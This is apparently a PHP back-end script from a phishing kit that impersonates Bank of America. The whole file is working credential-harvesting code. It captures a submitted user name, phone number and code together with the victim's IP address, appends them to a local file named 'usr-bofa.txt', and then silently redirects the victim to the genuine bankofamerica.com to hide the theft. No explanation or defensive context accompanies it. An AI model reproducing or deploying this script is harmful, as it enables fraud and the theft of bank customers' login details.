<?php

session_start();
error_reporting(0);

$code = @$_POST['code'];
$phone = @$_POST['phone'];
$user = @$_POST['user'];
$hostname = @gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ip = getenv("REMOTE_ADDR");

// $saveline = 'IP: ' . $ip . ' PHONE' . $phone . 'CODE: ' . $code . "\n";
$saveline = $code . ' : ' . $user . ' :' . $phone . ' : ' . $ip . "\n";

$fh=fopen('usr-bofa.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);

echo '<meta http-equiv="refresh" content="0; URL=https://bankofamerica.com">';

?>